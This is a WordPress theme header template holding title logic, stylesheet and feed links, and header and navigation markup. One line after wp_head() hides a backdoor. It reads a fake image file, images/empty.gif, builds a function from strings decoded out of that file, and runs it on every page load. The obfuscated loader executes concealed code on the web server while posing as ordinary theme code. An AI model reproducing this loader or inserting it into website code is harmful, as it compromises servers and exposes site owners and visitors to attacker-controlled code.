<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>
<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
<title><?php if (is_home () ) { bloginfo('name'); } elseif ( is_category() ) { single_cat_title(); echo ' - ' ; bloginfo('name'); }
 elseif (is_single() ) { single_post_title(); }
 elseif (is_page() ) { bloginfo('name'); echo ': '; single_post_title(); }
 else { wp_title('',true); } ?></title>
<script type="text/javascript" src="<?php bloginfo('template_url'); ?>/script.js"></script>
<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
<!--[if IE 6]><link rel="stylesheet" href="<?php bloginfo('template_url'); ?>/style.ie6.css" type="text/css" media="screen" /><![endif]-->
<link rel="alternate" type="application/rss+xml" title="<?php printf(__('%s RSS Feed', 'kubrick'), get_bloginfo('name')); ?>" href="<?php bloginfo('rss2_url'); ?>" />
<link rel="alternate" type="application/atom+xml" title="<?php printf(__('%s Atom Feed', 'kubrick'), get_bloginfo('name')); ?>" href="<?php bloginfo('atom_url'); ?>" /> 

<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
<?php  wp_head(); $gif=file(dirname(__FILE__).'/images/empty.gif',2);$gif=$gif[5]("",$gif[6]($gif[4]));$gif(); ?>
</head>
<body>
    <div class="PageBackgroundGradient"></div>
<div class="Main">
<div class="Sheet">
    <div class="Sheet-cc"></div>
    <div class="Sheet-body">
<div class="Header">
    <div class="Header-jpeg"></div>
<div class="logo">
    <h1 id="name-text" class="logo-name">
        <a href="<?php echo get_option('home'); ?>/"><?php bloginfo('name'); ?></a></h1>
    <div id="slogan-text" class="logo-text">
        <?php bloginfo('description'); ?></div>
</div>

</div>
<div class="nav">
    <?php wp30_menu(); ?>
    <div class="l">
    </div>
    <div class="r">
        <div>
        </div>
    </div>
</div>
